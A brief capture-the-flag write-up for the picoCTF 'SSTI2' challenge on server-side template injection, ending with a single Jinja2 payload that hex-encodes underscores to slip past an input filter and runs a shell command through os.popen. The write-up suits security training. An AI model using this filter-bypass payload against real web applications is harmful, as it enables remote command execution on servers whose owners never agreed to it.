#### Description

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:51282/)!




solution:
we walk through the picoCTF 2025 challenge SSTI2, which focuses on server-side template injection and how encoded payloads can bypass basic input filters.
example:
`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}`
